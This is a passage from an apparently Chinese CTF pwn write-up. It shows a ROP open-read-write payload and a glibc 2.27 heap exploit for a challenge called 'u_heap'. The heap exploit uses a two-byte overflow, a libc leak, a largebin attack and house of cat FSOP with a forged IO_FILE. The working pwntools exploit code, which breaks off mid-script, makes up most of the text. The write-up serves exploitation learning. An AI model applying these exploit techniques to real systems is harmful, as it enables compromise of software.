class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(<span class="number">0x0000000000401363</span>)+p64(<span class="number">0x404028</span>)+p64(<span class="number">0x4010B0</span>)+p64(<span class="number">0x4010F4</span>)</span><br><span class="line">sla(<span class="string">&quot;pwn!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x404060</span>+<span class="number">0x200</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000023b6a</span>+libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002601f</span>+libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span>+libc_base</span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000036174</span>+libc_base</span><br><span class="line">syscall_ret = <span class="number">0x0000000000083f6c</span>+libc_base</span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000000226c0</span>+libc_base</span><br><span class="line"></span><br><span class="line">open_libc = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_libc = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_libc = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rax_ret) + p64(0)</span></span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x300</span>)</span><br><span class="line">payload += p64(read_libc)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;pwn!&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rax_ret) + p64(2)</span></span><br><span class="line">payload = <span class="number">0x120</span> * <span class="string">b&quot;a&quot;</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x300</span>)</span><br><span class="line">payload += p64(read_libc)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_libc)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rax_ret) + p64(0)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(read_libc)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rax_ret) + p64(1)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(write_libc)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">flag = <span class="string">&quot;flag&quot;</span></span><br><span class="line">p.send(flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="u-heap"><a href="#u-heap" class="headerlink" title="u_heap"></a>u_heap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=dc263a465ef3a751f65d9680e8cac0ed688783d3, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>堆溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( key )</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)chunk_list[index], size_list[index] + <span class="number">2</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)chunk_list[index], (<span class="keyword">int</span>)size_list[index]);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>本题目的限制有点多，首先可以利用堆溢出的两字节来覆盖相邻下一个 chunk 的 size，从而构造出 unsorted chunk，从而泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x68</span>+p16(<span class="number">0x4e1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x70</span>)</span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ec0c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>有了 libc_base 就可以触发程序提供的 gift 功能了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">writen(<span class="string">&quot;Input the password&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line"><span class="keyword">if</span> ( a1 == buf )</span><br><span class="line">&#123;</span><br><span class="line">  writen(<span class="string">&quot;Input the size&quot;</span>);</span><br><span class="line">  size = readn();</span><br><span class="line">  <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  writen(<span class="string">&quot;worong!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>只申请不写入，这里只能用于触发 largebin attack</li>
</ul>
<p>根据程序的功能，接下来肯定是要打 largebin attack 的，但在此之前有一个问题让我纠结了很久：到底要不要构造堆风水去泄露 heap_base：</p>
<ul>
<li>利用堆风水实现的错位可以使我们打印出 heap_addr </li>
<li>如果我们想构造堆风水去泄露 heap_addr，错位后的堆就不能使用 edit 去修改 large chunk</li>
<li>如果我们不泄露 heap_addr，就没法在 largebin attack 后构造 house of cat 来打 IO</li>
</ul>
<p>这似乎是一个两难的选择，我在打比赛时两种方式都试过，最后选择先不泄露 heap_addr</p>
<p>在 libc-2.27 版本下打 largebin attack 有两种方式，由于程序只提供了两次 free 的机会，因此我们只能选择将一个小于 large chunk 的 unsorted chunk 插入 largebin（另一种方法可以写两处地址，但是至少需要3个 free chunk）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x68</span>+p16(<span class="number">0x441</span>))</span><br><span class="line">gift(libc_base,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + <span class="number">0x3ec660</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">target_addr = io_list_all</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(target_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">gift(libc_base,<span class="number">0x600</span>)</span><br></pre></td></tr></table></figure>
<p>往 io_list_all 中写入可控 heap_addr 后，可以查看一下此时的堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1def2c0</span> —▸ <span class="number">0x7f4037bb3ca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x1def2c0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x440</span>: <span class="number">0x1def340</span> —▸ <span class="number">0x7f4037bb40a0</span> (main_arena+<span class="number">1120</span>) ◂— <span class="number">0x1def340</span></span><br></pre></td></tr></table></figure>
<ul>
<li>未进行 largebin attack 之前</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x1def340</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r8 <span class="number">0x1def340</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│    <span class="number">0x1def348</span> ◂— <span class="number">0x461</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│    <span class="number">0x1def350</span> —▸ <span class="number">0x1def2c0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│    <span class="number">0x1def358</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│    <span class="number">0x1def360</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│    <span class="number">0x1def368</span> —▸ <span class="number">0x1def2c0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>由于该 unsorted chunk 比 large chunk 小，因此该 chunk 在进入 largebin 后会插入 largebin 的尾部，也就是 large chunk-&gt;fd 的位置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x6020A0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x6020a0</span> —▸ <span class="number">0x1def260</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x6020a8</span> —▸ <span class="number">0x1def2d0</span> —▸ <span class="number">0x7f4037bb40a0</span> (main_arena+<span class="number">1120</span>) —▸ <span class="number">0x7f4037bb4090</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7f4037bb4080</span> (main_arena+<span class="number">1088</span>) ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x6020b0</span> —▸ <span class="number">0x1def350</span> —▸ <span class="number">0x1def2c0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>而这个位置的数据我们是可以打印的，也就泄露的 heap_base</li>
</ul>
<p>最后伪造 fake_IO_FILE 去打 house of cat，由于程序单个 chunk 没有太多空间，我们只能分段进行伪造，另外 2.27 版本的 house of cat 和高版本有些许不同，可以一边动调一边修改高版本 house of cat 的模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heap_base + <span class="number">0x340</span> </span><br><span class="line">payload_addr = heap_base + <span class="number">0x340</span> </span><br><span class="line">flag_addr = heap_base + <span class="number">0x340</span> </span><br><span class="line">success(<span class="string">&quot;fake_io_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_io_addr))</span><br><span class="line"></span><br><span class="line">fake_IO_FILE1 =  <span class="string">b&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(magic_addr)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE1 += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE1 += p64(setcontext)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE2 = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xa0</span>-<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE2 += p64(ret)</span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xb0</span>-<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xc0</span>-<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_FILE2 += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE2 += p64(_IO_wfile_jumps+<span class="number">0x30</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE2 += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE3 = <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;fake_io_addr+0x40 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_io_addr+<span class="number">0x40</span>))</span><br><span class="line">success(<span class="string">&quot;fake_IO_FILE1 len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_IO_FILE1)))</span><br><span class="line">success(<span class="string">&quot;fake_IO_FILE2 len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_IO_FILE2)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">payload = fake_IO_FILE1</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = fake_IO_FILE2</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(ret)*<span class="number">9</span>+p64(magic2_addr)+p64(fake_io_addr+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br></pre></td></tr></table></figure>
<ul>
<li>动调时重点看 cmp 指令是否可以满足跳转指令的条件，若不满足则尝试修改 fake_IO_FILE 甚至是堆风水</li>
</ul>
<p>当 house of cat 劫持程序执行流后，就可以调用 setcontext 完成栈迁移，最后打一个 ORW 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b*0x400F80\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">    sa(<span class="string">&quot;content&quot;</span>,data)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">password,size</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sa(<span class="string">&quot;password&quot;</span>,p64(password))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    add(i,<span class="number">0x68</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 